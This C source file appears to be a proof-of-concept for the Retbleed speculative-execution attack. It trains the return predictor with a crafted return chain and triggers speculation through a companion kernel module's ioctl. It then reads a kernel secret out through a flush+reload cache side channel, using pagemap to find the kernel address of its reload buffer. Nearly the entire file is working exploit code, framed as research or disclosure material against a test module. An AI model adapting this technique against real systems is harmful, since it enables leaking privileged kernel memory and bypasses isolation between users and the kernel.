// SPDX-License-Identifier: GPL-3.0-only
#include <err.h>
#include <setjmp.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include "./kmod_retbleed_poc/retbleed_poc_ioctl.h"
#include "common.h"

#define ROUNDS 10000
#define RB_PTR 0x3400000
#define RB_STRIDE_BITS 12
#define RB_SLOTS 0x10

#define RET_PATH_LENGTH 30
typedef unsigned long u64;
typedef unsigned char u8;

__attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};

static void print_results(u64 *results, int n) {
    for (int i = 0; i < n; ++i) {
        printf("%lu ", results[i]);
    }
    puts("");
}

// va of the history setup space
#define HISTORY_SPACE 0x788888000000

// 1MiB is enough. We bgb uses only the lower 19 bits, and since there's a
// risk of overflowing (dst0=..7f...., src1=..80....) we can keep the lower 19 for
// the src and the lower 20 for the dst.
#define HISTORY_SZ    (1UL<<21)

// fall inside the history buffer: ffffffff830000000 -> 0x30000000
#define HISTORY_MASK  (HISTORY_SZ-1)

#define OP_RET 0xc3

int main(int argc, char *argv[])
{
    setup_segv_handler();
    int fd_spec = open("/proc/" PROC_RETBLEED_POC, O_RDONLY);
    if(fd_spec < 0) {
        err(1, "open");
    }
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);

    struct synth_gadget_desc sg = { 0 };
    if (ioctl(fd_spec, REQ_GADGET, &sg) != 0) {
        err(1, "ioctl");
    }
    memset(results, 0, sizeof(results[0])*RB_SLOTS);
    u8* ret_path[RET_PATH_LENGTH+1] = {0};

    u8* train_space = (u8*)HISTORY_SPACE;
    MAP_OR_DIE(train_space, HISTORY_SZ, PROT_RWX, MMAP_FLAGS, -1, 0);

    ret_path[0] = (u8*)sg.kbr_dst;
    for (int i = 0; i < RET_PATH_LENGTH; ++i) {
        ret_path[i+1] = train_space + (sg.kbr_src & HISTORY_MASK);
    }
    train_space[sg.kbr_src & HISTORY_MASK] = OP_RET;

    u8* rb_va = (u8*)RB_PTR;

    mmap_huge(rb_va, 1<<21);

    u64 rb_pa = va_to_phys(fd_pagemap, RB_PTR);
    if (rb_pa == 0) {
        fprintf(stderr, "rb: no pa\n");
        exit(1);
    } else if ((rb_pa & 0x1fffff) != 0) {
        fprintf(stderr, "rb: not huge\n");
        exit(1);
    }

    u64 rb_kva = rb_pa + sg.physmap_base;
    printf("rb_pa   0x%lx\n", rb_pa);
    printf("rb_kva  0x%lx\n", rb_kva);
    printf("kbr_src 0x%lx\n", sg.kbr_src);
    printf("kbr_dst 0x%lx\n", sg.kbr_dst);
    printf("secret  0x%lx\n", sg.secret);

    struct payload p;
    p.secret = sg.secret;
    p.reload_buffer = rb_kva;

    flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
    for (int i = 0; i < ROUNDS; ++i) {
        asm("lfence");
        flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
        for (int j = 0; j < 2; ++j) {
            should_segfault = 1;
            int a = sigsetjmp(env, 1);
            if (a == 0) {
                __asm__(
                        "mov %[retp], %%r10 \n\t"
                        ".rept " xstr(RET_PATH_LENGTH+1) "\n\t"
                        "pushq (%%r10)\n\t"
                        "add $8, %%r10\n\t"
                        ".endr\n\t"
                        "ret\n\t"
                        :: [retp]"r"(ret_path) : "rax", "rdi", "r8", "r10");
            }
            should_segfault = 0;
        }
        if (ioctl(fd_spec, REQ_SPECULATE, &p) != 0) { err(12, "ioctl"); }
        reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);
    }
    print_results(results, RB_SLOTS);
    return 0;
}
